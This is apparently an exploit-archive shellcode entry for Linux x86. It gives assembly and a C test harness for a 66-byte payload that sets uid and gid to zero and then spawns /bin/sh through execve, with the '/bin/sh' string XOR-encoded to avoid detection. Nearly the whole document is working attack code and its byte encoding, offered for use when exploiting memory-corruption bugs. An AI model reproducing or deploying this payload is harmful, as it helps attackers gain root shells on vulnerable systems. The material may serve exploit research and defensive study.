;Title: Linux/x86 - 66 byte - execve(/bin/sh) - setuid(0) - setgid(0) - XOR encrypted
;Author: nullparasite
;Contact: nullparasite@protonmail.ch
;Category: Shellcode
;Architecture: Linux x86
;Description: This shellcode, first set uid and gid to zero then call shell using execve. Also, /bin/sh defined as a XOR encrypted.
;Tested on: Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux

====================================================================

global _start

section .text

_start:
jmp entrypoint ; jump immd.

prepare:
pop esi ; address of string -> esi
xor eax, eax ; clear eax
xor ecx, ecx ; ecx
mov BYTE [esi+7], al ; terminate string, str[7] = NULL
lea ebx, [esi] ; put address of string -> ebx
mov DWORD [esi + 8], ebx ; replace first 4-# with string
mov DWORD [esi + 12], eax ; replace last 4-# with NULL

mov BYTE cl, 7 ; set counter to 7

decode:
xor BYTE [esi + ecx - 1], 0x3 ; s[cl-1] = s[cl-1] ^ 3
sub cl, 1 ; dec count by 1
jnz decode ; jump if not zero

priv_setuid:
xor ebx, ebx ; clear ebx, setuid(0)
mov al, 0x17 ; setuid = 0x17
int 0x80 ; trap

priv_setgid:
xor ebx, ebx ; clear ebx, setgid(0)
mov al, 0x2e ; setgid = 0x2e
int 0x80 ; trap

shell:
mov BYTE al, 0x0b ; execve = 0x0b
mov ebx, esi ; arg1, /bin/sh
lea ecx, [esi + 8] ; arg2, p[0] = /bin/sh, p[1] = NULL
lea edx, [esi + 12] ; arg3, pointer to NULL

int 0x80 ; trap

entrypoint:
call prepare ; call prepare
db ',ajm,pk#########' ; store string on the stack

====================================================================

# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing

#include<stdio.h>

unsigned char code[] = "\xeb\x34\x5e\x31\xc0\x31\xc9\x88\x46\x07\x8d"
"\x1e\x89\x5e\x08\x89\x46\x0c\xb1\x07\x80\x74"
"\x0e\xff\x03\x80\xe9\x01\x75\xf6\x31\xdb\xb0"
"\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8"
"\xc7\xff\xff\xff\x2c\x61\x6a\x6d\x2c\x70\x6b";

typedef int(*shellcode_t)();

int main(){
shellcode_t ret = (shellcode_t)code;
ret();
}

====================================================================